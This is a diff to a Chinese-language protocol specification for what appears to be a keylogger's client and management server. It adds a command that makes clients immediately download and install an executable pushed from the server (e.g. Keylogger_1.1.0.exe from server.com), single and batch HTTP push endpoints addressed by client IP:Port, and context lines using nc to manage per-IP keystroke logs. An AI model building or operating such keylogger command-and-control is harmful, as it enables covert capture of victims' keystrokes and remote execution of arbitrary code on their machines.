@@ -289,6 +289,44 @@
 }
 ```
 
+### 11. 获取版本列表
+
+**命令**：`get_versions`
+
+**功能**：获取服务器上所有可用版本列表
+
+**请求格式**：
+```json
+{"action": "get_versions"}
+```
+
+**响应格式**：
+```json
+{
+  "status": "ok",
+  "type": "versions_list",
+  "data": {
+    "current_version": "1.0.0",
+    "versions": [...]
+  }
+}
+```
+
+### 12. 接收服务器推送的更新
+
+**命令**：`update_to`
+
+**功能**：接收服务器推送的更新指令并执行更新（服务器主动控制模式）
+
+**请求格式**：
+```json
+{"action": "update_to", "version": "1.1.0", "download_url": "http://server.com/Keylogger_1.1.0.exe"}
+```
+
+**说明**：
+- 此命令由管理平台主动推送，客户端被动接收
+- 客户端收到指令后会立即开始下载并安装更新
+
 ## 使用示例
 
 ### 示例 1：连接测试
@@ -334,6 +372,99 @@ echo '{"action":"delete_log","file":"192.168.1.100_20250401.log"}' | nc 192.168.
 4. **日志格式**：只处理 `IP_YYYYMMDD.log` 格式的日志文件
 5. **错误重试**：网络错误时建议实现重试机制
 
+## HTTP API（管理平台）
+
+### 向指定客户端推送更新
+
+**接口**：`POST /api/clients/:clientId/update`
+
+**功能**：向指定客户端推送更新指令
+
+**请求头**：
+```
+Content-Type: application/json
+Cookie: auth_token=xxx
+```
+
+**请求参数**：
+| 参数 | 类型 | 必填 | 说明 |
+|------|------|------|------|
+| clientId | string | 是 | 客户端ID（格式：IP:Port） |
+| version | string | 是 | 目标版本号（X.Y.Z格式） |
+| download_url | string | 是 | 更新文件下载链接 |
+
+**请求示例**：
+```json
+{
+  "version": "1.1.0",
+  "download_url": "http://server.com/downloads/Keylogger_1.1.0.exe"
+}
+```
+
+**响应示例**：
+```json
+{
+  "success": true,
+  "message": "更新指令已发送到客户端 192.168.1.100:9999",
+  "data": {
+    "clientId": "192.168.1.100:9999",
+    "version": "1.1.0",
+    "download_url": "http://server.com/downloads/Keylogger_1.1.0.exe"
+  }
+}
+```
+
+**错误响应**：
+```json
+{
+  "error": "客户端离线或不存在"
+}
+```
+
+### 批量向多个客户端推送更新
+
+**接口**：`POST /api/clients/batch-update`
+
+**功能**：批量向多个客户端推送更新指令
+
+**请求头**：
+```
+Content-Type: application/json
+Cookie: auth_token=xxx
+```
+
+**请求参数**：
+| 参数 | 类型 | 必填 | 说明 |
+|------|------|------|------|
+| clientIds | array | 是 | 客户端ID数组 |
+| version | string | 是 | 目标版本号（X.Y.Z格式） |
+| download_url | string | 是 | 更新文件下载链接 |
+
+**请求示例**：
+```json
+{
+  "clientIds": ["192.168.1.100:9999", "192.168.1.101:9999"],
+  "version": "1.1.0",
+  "download_url": "http://server.com/downloads/Keylogger_1.1.0.exe"
+}
+```
+
+**响应示例**：
+```json
+{
+  "success": true,
+  "message": "更新指令已发送，成功: 2，失败: 0",
+  "data": {
+    "version": "1.1.0",
+    "download_url": "http://server.com/downloads/Keylogger_1.1.0.exe",
+    "results": [
+      { "clientId": "192.168.1.100:9999", "success": true },
+      { "clientId": "192.168.1.101:9999", "success": true }
+    ]
+  }
+}
+```
+
 ## 版本历史
 
 | 版本 | 变更内容 | 日期 |
@@ -341,3 +472,5 @@ echo '{"action":"delete_log","file":"192.168.1.100_20250401.log"}' | nc 192.168.
 | 1.0 | 初始版本 | 2025-04-17 |
 | 1.1 | 添加 `upload_once` 支持 `count` 参数 | 2025-04-17 |
 | 1.2 | 添加 `get_logs_info` 和 `delete_log` 命令 | 2025-04-17 |
+| 1.3 | 添加 `get_versions` 命令，ping/get_status 响应添加 version 字段 | 2026-05-06 |
+| 1.4 | 重构更新功能为服务器主动控制模式，移除 `check_update`，添加 `update_to` 命令 | 2026-05-07 |
